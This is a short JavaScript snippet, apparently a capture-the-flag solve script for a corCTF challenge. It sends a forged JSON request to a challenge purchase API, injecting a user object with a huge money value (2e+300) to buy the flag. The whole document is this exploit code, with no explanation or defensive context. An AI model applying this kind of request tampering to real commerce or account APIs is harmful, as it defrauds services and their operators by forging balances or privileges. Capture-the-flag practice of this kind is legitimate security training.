let username = "gray2"; //change depends on user currently logged in

let data = {
    flag: "corCTF",
    user: {
     user: username,
     flags: [],
     money: 2e+300,
    }
};

fetch("https://buyme.be.ax/api/buy", {
  method: "POST", 
  body: JSON.stringify(data),
  headers: {
    "Content-Type": "application/json"
  }
}).then(res => {
  console.log("Request complete! response:", res);
});